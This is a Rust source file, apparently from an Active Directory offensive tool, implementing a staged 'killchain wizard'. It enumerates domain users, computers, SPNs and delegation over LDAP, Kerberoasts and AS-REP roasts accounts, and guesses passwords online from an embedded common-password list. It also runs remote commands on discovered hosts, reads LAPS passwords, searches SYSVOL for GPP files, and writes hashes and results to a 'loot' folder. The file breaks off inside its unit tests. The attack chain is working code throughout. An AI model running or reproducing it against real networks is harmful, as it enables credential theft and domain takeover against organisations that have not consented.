//! Killchain Wizard -- Step-by-step AD engagement with live results.
//!
//! Walks through enumeration, credential harvesting, cracking, execution,
//! and post-exploitation, printing colored results at each stage.

use console::style;
use overthrone_core::exec::{ExecCredentials, auto_exec};
use overthrone_core::proto::kerberos::{asrep_roast, kerberoast, request_tgt};
use overthrone_core::proto::laps_ldaps::read_laps_passwords_ws2025;
use overthrone_core::proto::ldap::{AdComputer, LdapSession};
use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use tracing::debug;

pub struct KillchainWizard {
    config: WizardConfig,
    state: KillchainState,
    loot_dir: PathBuf,
}

#[derive(Debug, Clone)]
pub struct WizardConfig {
    pub dc_host: String,
    pub domain: String,
    pub username: String,
    pub password: String,
    pub target_hosts: Vec<String>,
    pub output_dir: Option<String>,
    pub ldaps: bool,
    pub use_hash: bool,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct KillchainState {
    pub domain_sid: Option<String>,
    pub users: Vec<String>,
    pub groups: Vec<String>,
    pub computers: Vec<String>,
    pub target_hosts: Vec<String>,
    pub spns: Vec<String>,
    pub kerberoast_hashes: Vec<String>,
    pub asrep_hashes: Vec<String>,
    pub valid_creds: Vec<(String, String)>,
    pub admin_hosts: Vec<String>,
    pub exec_results: Vec<ExecResult>,
    pub loot_files: Vec<PathBuf>,
    pub findings: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExecResult {
    pub host: String,
    pub command: String,
    pub output: String,
    pub method: String,
    pub success: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KillchainResult {
    pub domain: String,
    pub dc_host: String,
    pub timestamp: String,
    pub state: KillchainResultState,
    pub loot_files: Vec<String>,
    pub total_findings: usize,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct KillchainResultState {
    pub users_enumerated: usize,
    pub groups_enumerated: usize,
    pub computers_enumerated: usize,
    pub spns_found: usize,
    pub kerberoast_hashes: usize,
    pub asrep_hashes: usize,
    pub valid_creds_found: usize,
    pub admin_hosts: usize,
    pub exec_successes: usize,
    pub exec_failures: usize,
    pub laps_passwords: usize,
    pub findings: Vec<String>,
}

fn stage_header(stage: u8, name: &str) {
    println!(
        "\n{}",
        style(format!("=== STAGE {}: {} ===", stage, name))
            .green()
            .bold()
    );
}

fn pass(msg: &str) {
    println!(
        "  {} {}",
        style("[PASS]").green().bold(),
        style(msg).white()
    );
}

fn fail(msg: &str) {
    println!("  {} {}", style("[FAIL]").red().bold(), style(msg).white());
}

fn skip(msg: &str) {
    println!(
        "  {} {}",
        style("[SKIP]").yellow().bold(),
        style(msg).white()
    );
}

fn info_line(msg: &str) {
    println!("  {} {}", style("[*]").blue().bold(), style(msg).white());
}

fn finding(msg: &str) {
    println!(
        "  {} {}",
        style("[!]").red().bold(),
        style(msg).yellow().bold()
    );
}

fn extract_user_from_hash(hash: &str) -> Option<String> {
    let parts: Vec<&str> = hash.split('$').collect();
    if parts.len() >= 4 {
        // Impacket/hashcat kerberoast hashes start this field with the `*` that
        // delimits the `*user$realm$spn*` triple, so strip it before splitting.
        let user_realm_spn = parts[3].strip_prefix('*').unwrap_or(parts[3]);
        if let Some(user) = user_realm_spn.split('*').next()
            && !user.is_empty()
        {
            return Some(user.to_string());
        }
    }
    None
}

/// Build the wizard's working target list from the LDAP computer objects.
///
/// The previous implementation kept only `dnsHostName`, so any computer whose
/// forward DNS record was missing (very common for member servers and for
/// lab/GOAD-style environments) silently disappeared from the attack path.
/// This version, in order:
///
/// 1. adds the domain controllers discovered through the
///    `_ldap._tcp.dc._msdcs.<domain>` SRV records -- the DNS equivalent of
///    following the LDAP `serverReferenceBL` backlink -- together with their
///    resolved IPs;
/// 2. adds every computer's `dnsHostName`, falling back to the NetBIOS
///    `sAMAccountName` (`DC01$` -> `DC01`, plus `.<domain>` for DCs) when DNS is
///    absent;
/// 3. resolves each of those names and merges the resulting addresses, so the
///    list is directly usable by `auto_exec` without further DNS.
///
/// Duplicates are removed case-insensitively and the original ordering is kept.
async fn build_target_hosts(computers: &[AdComputer], domain: &str) -> Vec<String> {
    use futures::StreamExt;
    use std::collections::HashSet;

    fn push(out: &mut Vec<String>, seen: &mut HashSet<String>, value: &str) {
        let value = value.trim();
        if value.is_empty() {
            return;
        }
        if seen.insert(value.to_ascii_lowercase()) {
            out.push(value.to_string());
        }
    }

    let mut out: Vec<String> = Vec::new();
    let mut seen: HashSet<String> = HashSet::new();
    let mut candidates: Vec<String> = Vec::new();

    // -- 1. Domain controllers via DNS SRV (falls back to nothing on failure) --
    if let Ok(dcs) = overthrone_core::proto::dns::discover_domain_controllers(domain).await {
        for (name, ips) in dcs {
            candidates.push(name.clone());
            for ip in ips {
                candidates.push(ip);
            }
        }
    }

    // -- 2. Computer objects ------------------------------------------------
    for c in computers {
        let netbios = c.sam_account_name.trim_end_matches('$').to_string();
        if let Some(dns) = c.dns_hostname.as_ref().filter(|d| !d.is_empty()) {
            candidates.push(dns.clone());
        }
        if !netbios.is_empty() {
            candidates.push(netbios.clone());
            // Domain controllers are reachable by their short name only inside
            // the domain, so also queue the FQDN form.
            let is_dc = c.user_account_control & 0x2000 != 0; // SERVER_TRUST_ACCOUNT
            if is_dc && !domain.is_empty() {
                candidates.push(format!("{netbios}.{domain}"));
            }
        }
    }

    // -- 3. Resolve every candidate to an address ----------------------------
    let resolved: Vec<(String, Vec<String>)> = futures::stream::iter(candidates.iter().cloned())
        .map(|name| async move {
            let addrs = overthrone_core::proto::dns::resolve_hostname(&name)
                .await
                .unwrap_or_default();
            (name, addrs)
        })
        .buffer_unordered(16)
        .collect()
        .await;

    for (name, addrs) in resolved {
        push(&mut out, &mut seen, &name);
        for ip in addrs {
            push(&mut out, &mut seen, &ip);
        }
    }

    out
}

impl KillchainWizard {
    pub fn new(config: WizardConfig) -> Self {
        let loot_dir = config
            .output_dir
            .as_ref()
            .map(PathBuf::from)
            .unwrap_or_else(|| PathBuf::from("./loot"));
        Self {
            config,
            state: KillchainState::default(),
            loot_dir,
        }
    }

    pub async fn run(&mut self) -> anyhow::Result<KillchainResult> {
        self.print_banner();
        tokio::fs::create_dir_all(&self.loot_dir).await?;
        self.stage_enumerate().await?;
        self.stage_find_credentials().await?;
        self.stage_crack_hashes().await;
        self.stage_execute().await;
        self.stage_postexploit().await;
        let result = self.stage_report().await?;
        self.print_final_summary(&result);
        Ok(result)
    }

    fn print_banner(&self) {
        println!("{}", style("KILLCHAIN WIZARD").red().bold());
        println!(
            "  {} {}",
            style(">").red(),
            style(format!(
                "{}\\{} @ DC: {}",
                self.config.domain, self.config.username, self.config.dc_host
            ))
            .yellow()
            .bold()
        );
        println!();
    }

    async fn stage_enumerate(&mut self) -> anyhow::Result<()> {
        stage_header(1, "ENUMERATE");
        let dc = &self.config.dc_host;
        let domain = &self.config.domain;

        info_line(&format!("Connecting to LDAP on {dc}..."));
        let session = if self.config.use_hash {
            LdapSession::connect_with_hash(
                dc,
                domain,
                &self.config.username,
                &self.config.password,
                self.config.ldaps,
            )
            .await
        } else {
            LdapSession::connect(
                dc,
                domain,
                &self.config.username,
                &self.config.password,
                self.config.ldaps,
            )
            .await
        };

        let mut session = match session {
            Ok(s) => {
                pass("LDAP connection established");
                s
            }
            Err(e) => {
                fail(&format!("LDAP connection failed: {e}"));
                return Ok(());
            }
        };

        info_line("Enumerating domain users...");
        match session.enumerate_users().await {
            Ok(users) => {
                let count = users.len();
                self.state.users = users.iter().map(|u| u.sam_account_name.clone()).collect();
                let enabled = users.iter().filter(|u| u.enabled).count();
                let admins = users.iter().filter(|u| u.admin_count).count();
                pass(&format!(
                    "{count} users found ({enabled} enabled, {admins} admin)"
                ));
                self.state
                    .findings
                    .push(format!("Enumerated {count} domain users"));
            }
            Err(e) => fail(&format!("User enumeration failed: {e}")),
        }

        info_line("Enumerating domain groups...");
        match session.enumerate_groups().await {
            Ok(groups) => {
                let count = groups.len();
                self.state.groups = groups.iter().map(|g| g.sam_account_name.clone()).collect();
                pass(&format!("{count} groups found"));
            }
            Err(e) => fail(&format!("Group enumeration failed: {e}")),
        }

        info_line("Enumerating domain computers...");
        match session.enumerate_computers().await {
            Ok(computers) => {
                let count = computers.len();
                self.state.computers = computers
                    .iter()
                    .map(|c| c.sam_account_name.clone())
                    .collect();
                if self.config.target_hosts.is_empty() {
                    let resolved = build_target_hosts(&computers, &self.config.domain).await;
                    info_line(&format!(
                        "Target host list: {} name(s)/IP(s)",
                        resolved.len()
                    ));
                    self.state.target_hosts = resolved;
                } else {
                    self.state.target_hosts = self.config.target_hosts.clone();
                }
                pass(&format!("{count} computers found"));
            }
            Err(e) => fail(&format!("Computer enumeration failed: {e}")),
        }

        info_line("Enumerating SPNs (Kerberoastable accounts)...");
        match session.find_kerberoastable().await {
            Ok(users) => {
                let spns: Vec<String> = users
                    .iter()
                    .flat_map(|u| u.service_principal_names.clone())
                    .collect();
                let count = spns.len();
                self.state.spns = spns;
                for u in &users {
                    for spn in &u.service_principal_names {
                        info_line(&format!("  SPN: {spn} ({})", u.sam_account_name));
                    }
                }
                pass(&format!("{count} SPNs found"));
            }
            Err(e) => fail(&format!("SPN enumeration failed: {e}")),
        }

        info_line("Enumerating AS-REP Roastable accounts...");
        match session.find_asrep_roastable().await {
            Ok(users) => {
                let count = users.len();
                for u in &users {
                    info_line(&format!("  AS-REP: {}", u.sam_account_name));
                }
                pass(&format!("{count} AS-REP roastable accounts"));
            }
            Err(e) => fail(&format!("AS-REP enumeration failed: {e}")),
        }

        info_line("Checking delegation configurations...");
        if let Ok(users) = session.find_constrained_delegation_users().await
            && !users.is_empty()
        {
            for u in &users {
                finding(&format!(
                    "Constrained delegation: {} -> {:?}",
                    u.sam_account_name, u.allowed_to_delegate_to
                ));
            }
            self.state
                .findings
                .push(format!("{} users with constrained delegation", users.len()));
        }
        if let Ok(computers) = session.find_unconstrained_delegation().await
            && !computers.is_empty()
        {
            for c in &computers {
                finding(&format!(
                    "Unconstrained delegation: {} ({})",
                    c.sam_account_name,
                    c.dns_hostname.as_deref().unwrap_or("?")
                ));
            }
            self.state.findings.push(format!(
                "{} computers with unconstrained delegation",
                computers.len()
            ));
        }

        println!(
            "\n  {}",
            style(format!(
                "Stage 1 complete: {} users, {} groups, {} computers, {} SPNs",
                self.state.users.len(),
                self.state.groups.len(),
                self.state.computers.len(),
                self.state.spns.len()
            ))
            .cyan()
            .bold()
        );
        Ok(())
    }

    // Stage 2: Find Credentials
    async fn stage_find_credentials(&mut self) -> anyhow::Result<()> {
        stage_header(2, "FIND CREDENTIALS");
        let dc = &self.config.dc_host;
        let domain = &self.config.domain;
        let user = &self.config.username;
        let pass_secret = &self.config.password;

        if self.state.spns.is_empty() {
            skip("No SPNs to Kerberoast");
        } else {
            info_line("Requesting TGT for Kerberoasting...");
            let use_hash = self.config.use_hash;
            let tgt_result = request_tgt(dc, domain, user, pass_secret, use_hash).await;
            let tgt = match tgt_result {
                Ok(t) => {
                    pass("TGT obtained");
                    t
                }
                Err(e) => {
                    fail(&format!("TGT request failed: {e}"));
                    self.stage_asrep_roastandalone().await;
                    return Ok(());
                }
            };

            let spns: Vec<String> = self.state.spns.clone();
            let mut hash_count = 0usize;
            for spn in &spns {
                info_line(&format!("Kerberoasting {spn}..."));
                match kerberoast(dc, &tgt, spn).await {
                    Ok(hash) => {
                        pass(&format!("Hash captured (etype={})", hash.etype));
                        self.state.kerberoast_hashes.push(hash.hash_string);
                        hash_count += 1;
                    }
                    Err(e) => fail(&format!("Kerberoast {spn} failed: {e}")),
                }
            }
            if hash_count > 0 {
                self.state
                    .findings
                    .push(format!("Captured {hash_count} Kerberoast hashes"));
            }
            self.stage_asrep_roast_with_tgt(Some(&tgt)).await;
        }

        self.stage_spray_operator().await;

        println!(
            "\n  {}",
            style(format!(
                "Stage 2 complete: {} Kerberoast + {} AS-REP hashes, {} valid creds",
                self.state.kerberoast_hashes.len(),
                self.state.asrep_hashes.len(),
                self.state.valid_creds.len()
            ))
            .cyan()
            .bold()
        );
        Ok(())
    }

    async fn stage_asrep_roastandalone(&mut self) {
        let dc = &self.config.dc_host;
        let domain = &self.config.domain;
        info_line("Performing AS-REP Roast (standalone, no TGT)...");
        let session = LdapSession::connect(
            dc,
            domain,
            &self.config.username,
            &self.config.password,
            self.config.ldaps,
        )
        .await;
        let mut session = match session {
            Ok(s) => s,
            Err(e) => {
                fail(&format!("LDAP connect for AS-REP failed: {e}"));
                return;
            }
        };
        let asrep_users = match session.find_asrep_roastable().await {
            Ok(u) => u,
            Err(e) => {
                fail(&format!("AS-REP user lookup failed: {e}"));
                return;
            }
        };
        if asrep_users.is_empty() {
            skip("No AS-REP roastable users found");
            return;
        }
        for u in &asrep_users {
            info_line(&format!("AS-REP Roasting {}...", u.sam_account_name));
            match asrep_roast(dc, domain, &u.sam_account_name).await {
                Ok(hash) => {
                    pass(&format!("Hash captured (etype={})", hash.etype));
                    self.state.asrep_hashes.push(hash.hash_string.clone());
                    self.state.kerberoast_hashes.push(hash.hash_string);
                }
                Err(e) => fail(&format!("AS-REP roast {} failed: {e}", u.sam_account_name)),
            }
        }
    }

    async fn stage_asrep_roast_with_tgt(
        &mut self,
        tgt: Option<&overthrone_core::proto::kerberos::TicketGrantingData>,
    ) {
        if tgt.is_none() {
            return self.stage_asrep_roastandalone().await;
        }
        let dc = &self.config.dc_host;
        let domain = &self.config.domain;
        info_line("AS-REP Roasting with LDAP enumeration...");
        let session = LdapSession::connect(
            dc,
            domain,
            &self.config.username,
            &self.config.password,
            self.config.ldaps,
        )
        .await;
        let mut session = match session {
            Ok(s) => s,
            Err(e) => {
                fail(&format!("LDAP connect for AS-REP failed: {e}"));
                return;
            }
        };
        let asrep_users = match session.find_asrep_roastable().await {
            Ok(u) => u,
            Err(e) => {
                fail(&format!("AS-REP user lookup failed: {e}"));
                return;
            }
        };
        if asrep_users.is_empty() {
            skip("No AS-REP roastable users found");
            return;
        }
        for u in &asrep_users {
            if self
                .state
                .asrep_hashes
                .iter()
                .any(|h| h.contains(&u.sam_account_name))
            {
                continue;
            }
            info_line(&format!("AS-REP Roasting {}...", u.sam_account_name));
            match asrep_roast(dc, domain, &u.sam_account_name).await {
                Ok(hash) => {
                    pass(&format!("Hash captured (etype={})", hash.etype));
                    self.state.asrep_hashes.push(hash.hash_string.clone());
                    self.state.kerberoast_hashes.push(hash.hash_string);
                }
                Err(e) => fail(&format!("AS-REP roast {} failed: {e}", u.sam_account_name)),
            }
        }
    }

    async fn stage_spray_operator(&mut self) {
        let dc = &self.config.dc_host;
        let domain = &self.config.domain;
        info_line("Validating operator credentials via LDAP bind...");
        let result = if self.config.use_hash {
            LdapSession::connect_with_hash(
                dc,
                domain,
                &self.config.username,
                &self.config.password,
                self.config.ldaps,
            )
            .await
        } else {
            LdapSession::connect(
                dc,
                domain,
                &self.config.username,
                &self.config.password,
                self.config.ldaps,
            )
            .await
        };
        match result {
            Ok(_) => {
                pass(&format!(
                    "Valid credentials: {}\\{}",
                    domain, self.config.username
                ));
                self.state
                    .valid_creds
                    .push((self.config.username.clone(), self.config.password.clone()));
                self.state.findings.push(format!(
                    "Valid operator credentials: {}\\{}",
                    domain, self.config.username
                ));
            }
            Err(e) => fail(&format!("Operator credential validation failed: {e}")),
        }
    }

    // Stage 3: Crack Hashes
    async fn stage_crack_hashes(&mut self) {
        stage_header(3, "CRACK HASHES");
        let total = self.state.kerberoast_hashes.len();
        if total == 0 {
            skip("No hashes to crack");
            println!("\n  {}", style("Stage 3 complete: 0 cracked").cyan().bold());
            return;
        }
        info_line(&format!("{total} hashes available for offline cracking"));
        for (i, hash) in self.state.kerberoast_hashes.iter().enumerate() {
            let preview = if hash.len() > 60 {
                format!("{}...", &hash[..60])
            } else {
                hash.clone()
            };
            info_line(&format!("  Hash {}: {}", i + 1, preview));
        }

        let embedded_passwords = [
            "Password1",
            "password",
            "Password123!",
            "Summer2024",
            "Winter2024",
            "Welcome1",
            "P@ssw0rd",
            "Admin123!",
            "Letmein1",
            "Company123!",
        ];
        info_line(&format!(
            "Testing {} embedded passwords against hashes...",
            embedded_passwords.len()
        ));

        let dc = &self.config.dc_host;
        let domain = &self.config.domain;
        let mut cracked = 0usize;
        for hash_str in &self.state.kerberoast_hashes {
            if let Some(user) = extract_user_from_hash(hash_str) {
                for pwd in &embedded_passwords {
                    if request_tgt(dc, domain, &user, pwd, false).await.is_ok() {
                        pass(&format!("Cracked {user} -> {pwd}"));
                        self.state.valid_creds.push((user.clone(), pwd.to_string()));
                        self.state
                            .findings
                            .push(format!("Password cracked: {user} -> {pwd}"));
                        cracked += 1;
                        break;
                    }
                }
            }
        }
        if cracked == 0 {
            info_line("No passwords cracked with embedded wordlist");
            info_line("Use hashcat: hashcat -m 13100 hashes.txt wordlist.txt");
        }
        println!(
            "\n  {}",
            style(format!("Stage 3 complete: {cracked}/{} cracked", total))
                .cyan()
                .bold()
        );
    }

    // Stage 4: Execute
    async fn stage_execute(&mut self) {
        stage_header(4, "EXECUTE");
        if self.state.valid_creds.is_empty() {
            skip("No valid credentials for execution");
            println!("\n  {}", style("Stage 4 complete: 0 exec").cyan().bold());
            return;
        }
        let raw_targets = if self.state.target_hosts.is_empty() {
            vec![self.config.dc_host.clone()]
        } else {
            let mut t = vec![self.config.dc_host.clone()];
            t.extend(self.state.target_hosts.clone());
            t
        };
        // Resolve hostnames to IPs, skip unresolvable ones
        let mut targets = Vec::new();
        let mut seen = std::collections::HashSet::new();
        for host in &raw_targets {
            if seen.contains(host) {
                continue;
            }
            seen.insert(host.clone());
            // If it looks like an IP, use directly
            if host.parse::<std::net::IpAddr>().is_ok() {
                targets.push(host.clone());
                continue;
            }
            // Try DNS resolution
            match tokio::net::lookup_host(format!("{host}:445")).await {
                Ok(addrs) => {
                    for addr in addrs {
                        let ip = addr.ip().to_string();
                        if !seen.contains(&ip) {
                            seen.insert(ip.clone());
                            targets.push(ip);
                        }
                    }
                }
                Err(_) => {
                    eprintln!("  [!] DNS resolution failed for {host}, skipping");
                }
            }
        }
        if targets.is_empty() {
            targets.push(self.config.dc_host.clone());
        }
        let creds = &self.state.valid_creds[0];
        let exec_creds = ExecCredentials {
            domain: self.config.domain.clone(),
            username: creds.0.clone(),
            password: creds.1.clone(),
            nt_hash: None,
        };
        let test_cmd = "whoami";
        for target in &targets {
            info_line(&format!("Executing '{test_cmd}' on {target}..."));
            match auto_exec(target, test_cmd, &exec_creds).await {
                Ok(output) => {
                    let stdout = output.stdout.trim().to_string();
                    let success = output.exit_code == Some(0) && !stdout.is_empty();
                    if success {
                        pass(&format!(
                            "{target}: {} ({})",
                            stdout.lines().next().unwrap_or(""),
                            output.method
                        ));
                        self.state.admin_hosts.push(target.clone());
                    } else {
                        fail(&format!(
                            "{target}: exit={:?} ({})",
                            output.exit_code, output.method
                        ));
                    }
                    self.state.exec_results.push(ExecResult {
                        host: target.clone(),
                        command: test_cmd.to_string(),
                        output: stdout,
                        method: output.method.to_string(),
                        success,
                    });
                }
                Err(e) => {
                    fail(&format!("{target}: {e}"));
                    self.state.exec_results.push(ExecResult {
                        host: target.clone(),
                        command: test_cmd.to_string(),
                        output: String::new(),
                        method: "none".to_string(),
                        success: false,
                    });
                }
            }
        }
        if let Some(admin_host) = self.state.admin_hosts.first().cloned() {
            info_line(&format!("Running recon on {admin_host}..."));
            for cmd in &[
                "hostname",
                "systeminfo",
                "net user",
                "net group \"Domain Admins\" /domain",
            ] {
                if let Ok(output) = auto_exec(&admin_host, cmd, &exec_creds).await {
                    let stdout = output.stdout.trim().to_string();
                    if !stdout.is_empty() {
                        pass(&format!(
                            "{}: {}",
                            cmd,
                            stdout.lines().next().unwrap_or("").trim()
                        ));
                    }
                }
            }
        }
        let successes = self.state.exec_results.iter().filter(|r| r.success).count();
        let failures = self.state.exec_results.len() - successes;
        println!(
            "\n  {}",
            style(format!(
                "Stage 4 complete: {successes} success, {failures} fail"
            ))
            .cyan()
            .bold()
        );
    }

    // Stage 5: Post-Exploitation
    async fn stage_postexploit(&mut self) {
        stage_header(5, "POST-EXPLOITATION");
        if self.state.admin_hosts.is_empty() {
            skip("No admin hosts for post-exploitation");
            println!(
                "\n  {}",
                style("Stage 5 complete: 0 findings").cyan().bold()
            );
            return;
        }
        let creds = &self.state.valid_creds[0];
        let exec_creds = ExecCredentials {
            domain: self.config.domain.clone(),
            username: creds.0.clone(),
            password: creds.1.clone(),
            nt_hash: None,
        };
        let dc = &self.config.dc_host;
        let domain = &self.config.domain;

        // LAPS
        info_line("Reading LAPS passwords via LDAP...");
        let session = if self.config.use_hash {
            LdapSession::connect_with_hash(
                dc,
                domain,
                &self.config.username,
                &self.config.password,
                self.config.ldaps,
            )
            .await
        } else {
            LdapSession::connect(
                dc,
                domain,
                &self.config.username,
                &self.config.password,
                self.config.ldaps,
            )
            .await
        };
        if let Ok(mut session) = session {
            match read_laps_passwords_ws2025(
                &mut session,
                None,
                dc,
                &self.config.username,
                &self.config.password,
            )
            .await
            {
                Ok(results) => {
                    if results.is_empty() {
                        info_line("No LAPS passwords readable");
                    } else {
                        let count = results.len();
                        for r in &results {
                            let pw = r
                                .password
                                .as_deref()
                                .or(r.laps_v2_password.as_deref())
                                .unwrap_or("(encrypted)");
                            pass(&format!("LAPS: {} -> {}", r.computer_name, pw));
                        }
                        self.state
                            .findings
                            .push(format!("Retrieved {count} LAPS passwords"));
                    }
                }
                Err(e) => {
                    debug!("LAPS query failed: {e}");
                    info_line("LAPS not available or insufficient permissions");
                }
            }
        }

        // DCSync check
        info_line("Checking DCSync capability...");
        if let Some(admin_host) = self.state.admin_hosts.first()
            && let Ok(output) = auto_exec(
                admin_host,
                "net group \"Domain Admins\" /domain",
                &exec_creds,
            )
            .await
        {
            let stdout = output.stdout.trim().to_string();
            if stdout.to_lowercase().contains("domain admins") {
                finding("Current user is likely Domain Admin (group membership confirmed)");
                self.state
                    .findings
                    .push("DCSync capability: Domain Admin confirmed".to_string());
            }
        }

        // GPP check
        info_line("Checking SYSVOL for GPP passwords...");
        if let Some(admin_host) = self.state.admin_hosts.first() {
            let gpp_cmd = "dir /s /b \\\\localhost\\SYSVOL\\*.xml 2>nul | findstr /i Groups.xml Services.xml ScheduledTasks.xml DataSources.xml";
            if let Ok(output) = auto_exec(admin_host, gpp_cmd, &exec_creds).await {
                let stdout = output.stdout.trim().to_string();
                if !stdout.is_empty() {
                    finding(&format!(
                        "GPP XML files found on SYSVOL: {} files",
                        stdout.lines().count()
                    ));
                    self.state
                        .findings
                        .push("GPP files detected on SYSVOL".to_string());
                } else {
                    info_line("No GPP files found on SYSVOL");
                }
            }
        }

        println!(
            "\n  {}",
            style(format!(
                "Stage 5 complete: {} findings",
                self.state.findings.len()
            ))
            .cyan()
            .bold()
        );
    }

    // Stage 6: Report
    async fn stage_report(&mut self) -> anyhow::Result<KillchainResult> {
        stage_header(6, "REPORT");
        let ts = chrono::Utc::now().format("%Y%m%d_%H%M%S").to_string();
        let domain_clean = self.config.domain.replace('.', "_");
        let report_name = format!("engagement_{domain_clean}_{ts}.json");

        // Save kerberoast hashes
        if !self.state.kerberoast_hashes.is_empty() {
            let hash_file = self.loot_dir.join(format!("kerberoast_{ts}.txt"));
            let content = self.state.kerberoast_hashes.join("\n");
            tokio::fs::write(&hash_file, &content).await?;
            self.state.loot_files.push(hash_file.clone());
            pass(&format!("Kerberoast hashes saved: {}", hash_file.display()));
        }

        // Save AS-REP hashes
        if !self.state.asrep_hashes.is_empty() {
            let hash_file = self.loot_dir.join(format!("asrep_{ts}.txt"));
            let content = self.state.asrep_hashes.join("\n");
            tokio::fs::write(&hash_file, &content).await?;
            self.state.loot_files.push(hash_file.clone());
            pass(&format!("AS-REP hashes saved: {}", hash_file.display()));
        }

        // Save exec results
        if !self.state.exec_results.is_empty() {
            let exec_file = self.loot_dir.join(format!("exec_results_{ts}.json"));
            let json = serde_json::to_string_pretty(&self.state.exec_results)?;
            tokio::fs::write(&exec_file, &json).await?;
            self.state.loot_files.push(exec_file.clone());
            pass(&format!("Exec results saved: {}", exec_file.display()));
        }

        // Full report
        let exec_successes = self.state.exec_results.iter().filter(|r| r.success).count();
        let result_state = KillchainResultState {
            users_enumerated: self.state.users.len(),
            groups_enumerated: self.state.groups.len(),
            computers_enumerated: self.state.computers.len(),
            spns_found: self.state.spns.len(),
            kerberoast_hashes: self.state.kerberoast_hashes.len(),
            asrep_hashes: self.state.asrep_hashes.len(),
            valid_creds_found: self.state.valid_creds.len(),
            admin_hosts: self.state.admin_hosts.len(),
            exec_successes,
            exec_failures: self.state.exec_results.len() - exec_successes,
            laps_passwords: self
                .state
                .findings
                .iter()
                .filter(|f| f.starts_with("Retrieved"))
                .count(),
            findings: self.state.findings.clone(),
        };

        let report = KillchainResult {
            domain: self.config.domain.clone(),
            dc_host: self.config.dc_host.clone(),
            timestamp: ts.clone(),
            state: result_state,
            loot_files: self
                .state
                .loot_files
                .iter()
                .map(|p| p.display().to_string())
                .collect(),
            total_findings: self.state.findings.len(),
        };

        let report_file = self.loot_dir.join(&report_name);
        let json = serde_json::to_string_pretty(&report)?;
        tokio::fs::write(&report_file, &json).await?;
        pass(&format!("Full report saved: {}", report_file.display()));
        println!(
            "\n  {}",
            style(format!(
                "Stage 6 complete: report at {}",
                report_file.display()
            ))
            .cyan()
            .bold()
        );
        Ok(report)
    }

    fn print_final_summary(&self, result: &KillchainResult) {
        println!(
            "\n{}",
            style("========================================")
                .green()
                .bold()
        );
        println!("{}", style("         KILLCHAIN SUMMARY").green().bold());
        println!(
            "{}",
            style("========================================")
                .green()
                .bold()
        );
        println!("  {} Domain: {}", style(">").cyan(), result.domain);
        println!("  {} DC: {}", style(">").cyan(), result.dc_host);
        println!();
        println!(
            "  {} Users: {}",
            style(">").cyan(),
            result.state.users_enumerated
        );
        println!(
            "  {} Groups: {}",
            style(">").cyan(),
            result.state.groups_enumerated
        );
        println!(
            "  {} Computers: {}",
            style(">").cyan(),
            result.state.computers_enumerated
        );
        println!("  {} SPNs: {}", style(">").cyan(), result.state.spns_found);
        println!();
        println!(
            "  {} Kerberoast hashes: {}",
            style(">").yellow(),
            result.state.kerberoast_hashes
        );
        println!(
            "  {} AS-REP hashes: {}",
            style(">").yellow(),
            result.state.asrep_hashes
        );
        println!(
            "  {} Valid credentials: {}",
            style(">").green(),
            result.state.valid_creds_found
        );
        println!(
            "  {} Admin hosts: {}",
            style(">").green(),
            result.state.admin_hosts
        );
        println!();
        println!(
            "  {} Exec successes: {}",
            style(">").green(),
            result.state.exec_successes
        );
        println!(
            "  {} Exec failures: {}",
            style(">").red(),
            result.state.exec_failures
        );
        println!();
        if !result.state.findings.is_empty() {
            println!("  {} Findings:", style(">").red().bold());
            for f in &result.state.findings {
                println!("    {} {}", style(">").yellow(), f);
            }
        }
        if !result.loot_files.is_empty() {
            println!();
            println!("  {} Loot files:", style(">").cyan());
            for f in &result.loot_files {
                println!("    {}", f);
            }
        }
        println!();
        println!(
            "{}",
            style("========================================")
                .green()
                .bold()
        );
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extract_user_from_hash_valid() {
        let hash = "$krb5tgs$23$*testuser$CORP.LOCAL$SPN*$abc123$def456";
        assert_eq!(extract_user_from_hash(hash), Some("testuser".to_string()));
    }

    #[test]
    fn extract_user_from_hash_empty_user() {
        let hash = "$krb5tgs$23$*$CORP.LOCAL$SPN*$abc123$def456";
        assert_eq!(extract_user_from_hash(hash), None);
    }

    #[test]
    fn extract_user_from_hash_too_few_parts() {
        let hash = "$krb5tgs$23";
        assert_eq!(extract_user_from_hash(hash), None);
    }

    #[test]
    fn wizard_config_debug_clone() {
        let config = WizardConfig {
            dc_host: "10.0.0.1".into(),
            domain: "corp.local".into(),
            username: "admin".into(),
            password: "pass".into(),
            target_hosts: vec![],
            output_dir: None,
            ldaps: false,
            use_hash: false,
        };
        let cloned = config.clone();
        assert_eq!(cloned.dc_host, "10.0.0.1");
        assert_eq!(cloned.domain, "corp.local");
    }

    #[test]
    fn killchain_state_default() {
        let state = KillchainState::default();
        assert!(state.users.is_empty());
        assert!(state.admin_hosts.is_empty());
        assert!(state.findings.is_empty());
    }

    #[test]
    fn exec_result_serialization_roundtrip() {
        let result = ExecResult {
            host: "dc01.corp.local".into(),
            command: "whoami".into(),
            output: "CORP\\admin".into(),
            method: "WinRM".into(),
            success: true,
        };
        let json = serde_json::to_string(&result).unwrap();
        let deserialized: ExecResult = serde_json::from_str(&json).unwrap();
        assert_eq!(deserialized.host, "dc01.corp.local");
        assert!(deserialized.success);
    }

    #[test]
    fn killchain_result_serialization_roundtrip() {
        let result = KillchainResult {
            domain: "corp.local".into(),
            dc_host: "10.0.0.1".into(),
            timestamp: "20260101_120000".into(),
            state: KillchainResultState {
                users_enumerated: 100,
                groups_enumerated: 20,
                computers_enumerated: 50,
                spns_found: 5,
                kerberoast_hashes: 3,
                asrep_hashes: 1,
                valid_creds_found: 2,
                admin_hosts: 1,
                exec_successes: 1,
                exec_failures: 0,
                laps_passwords: 5,
                findings: vec!["test finding".into()],
            },
            loot_files: vec!["loot/report.json".into()],
            total_findings: 1,
        };
        let json = serde_json::to_string_pretty(&result).unwrap();
        let deserialized: KillchainResult = serde_json::from_str(&json).unwrap();
        assert_eq!(deserialized.domain, "corp.local");
        assert_eq!(deserialized.state.users_enumerated, 100);
        assert_eq!(deserialized.total_findings, 1);
    }

    #[test]
    fn killchain_result_state_default() {
        let state = KillchainResultState::default();
        assert_eq!(state.users_enumerated, 0);
        assert_eq!(state.exec_successes, 0);
        assert!(state.findings.is_empty());
    }

    #[test]
    fn wizard_new_sets_loot_dir() {
        let config = WizardConfig {
            dc_host: "10.0.0.1".into(),
            domain: "corp.local".into(),
